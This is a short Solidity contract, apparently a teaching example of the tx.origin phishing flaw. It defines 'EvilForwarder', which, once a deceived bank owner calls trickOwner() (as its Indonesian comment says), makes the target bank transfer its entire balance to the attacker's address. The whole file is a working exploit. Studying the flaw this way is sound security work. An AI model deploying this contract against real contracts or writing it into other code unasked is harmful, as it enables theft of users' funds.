// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

interface ITxOriginBank {
    function transferTo(address payable _to, uint _amount) external;
}

contract EvilForwarder {
    address payable attacker;
    ITxOriginBank target;

    constructor(address _target) {
        attacker = payable(msg.sender);
        target = ITxOriginBank(_target);
    }

    // dipanggil oleh owner, yang tertipu
    function trickOwner() public {
        target.transferTo(attacker, address(target).balance);
    }
}
